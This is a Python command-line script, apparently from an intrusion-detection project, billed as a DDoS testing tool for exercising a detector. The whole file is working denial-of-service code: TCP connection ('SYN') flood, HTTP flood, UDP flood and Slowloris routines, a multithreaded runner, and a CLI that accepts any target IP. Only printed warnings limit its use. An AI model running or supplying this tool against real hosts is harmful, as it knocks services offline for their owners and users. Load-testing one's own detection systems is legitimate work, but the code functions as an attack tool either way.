#!/usr/bin/env python3
"""
DDoS Testing Tool - Simulate various attack patterns

Usage:
    python test_ddos.py --type syn_flood --duration 30
    python test_ddos.py --type http_flood --rate 100
    python test_ddos.py --type slowloris --connections 50
"""

import argparse
import socket
import random
import time
import threading
from datetime import datetime
import sys

class DDoSSimulator:
    """
    Simulate different types of DDoS attacks for testing
    
    ⚠️  WARNING: Chỉ sử dụng trên môi trường test của bạn!
    """
    
    def __init__(self, target_ip: str, target_port: int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_count = 0
        self.running = True
        
    def syn_flood(self, duration: int = 30):
        """
        SYN Flood Attack Simulation
        - Gửi nhiều SYN packets mà không hoàn thành TCP handshake
        - Làm cạn kiệt connection pool của server
        """
        print(f"🚀 Starting SYN Flood attack to {self.target_ip}:{self.target_port}")
        print(f"⏱️  Duration: {duration} seconds")
        
        start_time = time.time()
        
        while (time.time() - start_time) < duration and self.running:
            try:
                # Tạo socket mới
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                
                # Random source port
                src_port = random.randint(1024, 65535)
                
                # Attempt connection (SYN)
                try:
                    sock.connect((self.target_ip, self.target_port))
                except:
                    pass
                finally:
                    sock.close()
                
                self.attack_count += 1
                
                # Rate limiting
                time.sleep(0.001)
                
                if self.attack_count % 100 == 0:
                    print(f"  📊 Sent {self.attack_count} SYN packets...")
                    
            except Exception as e:
                continue
        
        print(f"\n✅ SYN Flood completed: {self.attack_count} packets sent")
    
    def http_flood(self, duration: int = 30, rate: int = 100):
        """
        HTTP Flood Attack Simulation
        - Gửi nhiều HTTP requests hợp lệ
        - Làm quá tải web server
        """
        print(f"🚀 Starting HTTP Flood attack to {self.target_ip}:{self.target_port}")
        print(f"⏱️  Duration: {duration}s | Rate: {rate} req/s")
        
        start_time = time.time()
        
        # User agents for realistic requests
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)",
        ]
        
        paths = ["/", "/index.html", "/api/data", "/search?q=test", "/login"]
        
        while (time.time() - start_time) < duration and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_ip, self.target_port))
                
                # Craft HTTP request
                path = random.choice(paths)
                ua = random.choice(user_agents)
                request = f"GET {path} HTTP/1.1\r\n"
                request += f"Host: {self.target_ip}\r\n"
                request += f"User-Agent: {ua}\r\n"
                request += "Connection: keep-alive\r\n\r\n"
                
                sock.send(request.encode())
                
                # Read response (optional)
                try:
                    sock.recv(1024)
                except:
                    pass
                
                sock.close()
                self.attack_count += 1
                
                if self.attack_count % 50 == 0:
                    print(f"  📊 Sent {self.attack_count} HTTP requests...")
                
                # Rate control
                time.sleep(1.0 / rate)
                
            except Exception as e:
                continue
        
        print(f"\n✅ HTTP Flood completed: {self.attack_count} requests sent")
    
    def udp_flood(self, duration: int = 30, packet_size: int = 1024):
        """
        UDP Flood Attack Simulation
        - Gửi nhiều UDP packets
        - Không cần connection, tốc độ cao
        """
        print(f"🚀 Starting UDP Flood attack to {self.target_ip}:{self.target_port}")
        print(f"⏱️  Duration: {duration}s | Packet size: {packet_size} bytes")
        
        start_time = time.time()
        
        # Random payload
        payload = random._urandom(packet_size)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while (time.time() - start_time) < duration and self.running:
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
                self.attack_count += 1
                
                if self.attack_count % 1000 == 0:
                    print(f"  📊 Sent {self.attack_count} UDP packets...")
                
                # Minimal delay
                time.sleep(0.0001)
                
            except Exception as e:
                continue
        
        sock.close()
        print(f"\n✅ UDP Flood completed: {self.attack_count} packets sent")
    
    def slowloris(self, duration: int = 60, connections: int = 50):
        """
        Slowloris Attack Simulation
        - Giữ nhiều connections mở nhưng gửi data chậm
        - Làm cạn kiệt connection pool
        """
        print(f"🚀 Starting Slowloris attack to {self.target_ip}:{self.target_port}")
        print(f"⏱️  Duration: {duration}s | Connections: {connections}")
        
        sockets = []
        
        # Open initial connections
        for i in range(connections):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                
                # Send partial HTTP request
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(f"Host: {self.target_ip}\r\n".encode())
                
                sockets.append(sock)
                print(f"  🔌 Connection {i+1}/{connections} opened")
                
            except Exception as e:
                continue
        
        print(f"\n✅ {len(sockets)} connections opened, keeping them alive...")
        
        # Keep connections alive
        start_time = time.time()
        
        while (time.time() - start_time) < duration and self.running:
            for sock in sockets[:]:
                try:
                    # Send partial header to keep connection alive
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    self.attack_count += 1
                except:
                    sockets.remove(sock)
            
            print(f"  💓 Keeping {len(sockets)} connections alive... ({int(time.time() - start_time)}s)")
            time.sleep(10)
        
        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
        
        print(f"\n✅ Slowloris completed: {len(sockets)} connections used")
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        print("\n⏸️  Stopping attack...")

def run_multithreaded_attack(simulator, attack_type: str, threads: int, **kwargs):
    """
    Run attack with multiple threads for higher load
    """
    print(f"🔥 Starting multi-threaded attack: {threads} threads")
    
    thread_list = []
    
    for i in range(threads):
        if attack_type == "syn":
            t = threading.Thread(target=simulator.syn_flood, kwargs=kwargs)
        elif attack_type == "http":
            t = threading.Thread(target=simulator.http_flood, kwargs=kwargs)
        elif attack_type == "udp":
            t = threading.Thread(target=simulator.udp_flood, kwargs=kwargs)
        else:
            continue
        
        t.start()
        thread_list.append(t)
    
    # Wait for all threads
    for t in thread_list:
        t.join()
    
    print(f"\n🏁 All {threads} threads completed")

def main():
    parser = argparse.ArgumentParser(
        description="DDoS Testing Tool - Test your detection system",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # SYN Flood attack for 30 seconds
  python test_ddos.py --target 192.168.1.200 --type syn --duration 30
  
  # HTTP Flood with 200 requests/second
  python test_ddos.py --target 192.168.1.200 --port 80 --type http --rate 200
  
  # UDP Flood with large packets
  python test_ddos.py --target 192.168.1.200 --type udp --packet-size 2048
  
  # Slowloris with 100 connections
  python test_ddos.py --target 192.168.1.200 --port 80 --type slowloris --connections 100
  
  # Multi-threaded attack (10 threads)
  python test_ddos.py --target 192.168.1.200 --type syn --threads 10
        """
    )
    
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--type", required=True, 
                       choices=["syn", "http", "udp", "slowloris"],
                       help="Attack type")
    parser.add_argument("--duration", type=int, default=30, 
                       help="Attack duration in seconds (default: 30)")
    parser.add_argument("--rate", type=int, default=100,
                       help="Request rate for HTTP flood (default: 100 req/s)")
    parser.add_argument("--packet-size", type=int, default=1024,
                       help="Packet size for UDP flood (default: 1024 bytes)")
    parser.add_argument("--connections", type=int, default=50,
                       help="Number of connections for Slowloris (default: 50)")
    parser.add_argument("--threads", type=int, default=1,
                       help="Number of attack threads (default: 1)")
    
    args = parser.parse_args()
    
    print("=" * 70)
    print("🎯 DDoS Testing Tool")
    print("=" * 70)
    print(f"⚠️  WARNING: This tool simulates DDoS attacks!")
    print(f"   Only use on systems you own or have permission to test.")
    print("=" * 70)
    print(f"\n📍 Target: {args.target}:{args.port}")
    print(f"🔧 Attack Type: {args.type.upper()}")
    print(f"⏱️  Duration: {args.duration}s")
    print(f"🧵 Threads: {args.threads}")
    print(f"🕐 Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("\n" + "=" * 70)
    
    # Countdown
    for i in range(3, 0, -1):
        print(f"Starting in {i}...")
        time.sleep(1)
    
    print("\n🚀 ATTACK STARTED!\n")
    
    simulator = DDoSSimulator(args.target, args.port)
    
    try:
        if args.threads > 1:
            # Multi-threaded attack
            run_multithreaded_attack(
                simulator, args.type, args.threads,
                duration=args.duration,
                rate=args.rate,
                packet_size=args.packet_size,
                connections=args.connections
            )
        else:
            # Single-threaded attack
            if args.type == "syn":
                simulator.syn_flood(duration=args.duration)
            elif args.type == "http":
                simulator.http_flood(duration=args.duration, rate=args.rate)
            elif args.type == "udp":
                simulator.udp_flood(duration=args.duration, packet_size=args.packet_size)
            elif args.type == "slowloris":
                simulator.slowloris(duration=args.duration, connections=args.connections)
    
    except KeyboardInterrupt:
        print("\n\n⚠️  Interrupted by user")
        simulator.stop()
    
    print("\n" + "=" * 70)
    print(f"🏁 Attack completed at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"📊 Total operations: {simulator.attack_count}")
    print("=" * 70)
    
    print("\n💡 Next steps:")
    print("  1. Check DDoS detector logs:")
    print("     docker logs -f ids_ddos_detector")
    print("\n  2. Check for alerts:")
    print("     kafka-console-consumer.sh --bootstrap-server localhost:9092 \\")
    print("       --topic ddos-alerts --from-beginning")
    print("\n  3. View metrics:")
    print(f"     curl http://localhost:8001/metrics | grep ddos")

if __name__ == "__main__":
    main()
